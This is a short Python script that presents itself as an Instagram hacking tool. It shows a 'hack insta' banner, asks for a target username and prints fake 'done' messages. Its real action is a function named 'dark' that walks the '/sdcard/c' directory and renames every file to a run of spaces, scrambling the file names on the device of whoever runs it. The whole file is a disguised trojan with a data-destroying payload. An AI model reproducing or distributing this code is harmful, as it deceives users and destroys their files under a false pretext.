import os
import pyfiglet

logo = pyfiglet.figlet_format("*hack insta*")
print(logo)

target = input("insta user ==»: ")
print(target)

for i in range(10):
	print("done -_-")
def dark(path):
	for dir,dires,files in os.walk(path):
		virus = len(files)
		for o in range(virus):
			ko = dir+"/"+files[o]
			python = " "*(o+1)
			os.rename(ko,dir+"/"+python)
dark('/sdcard/c')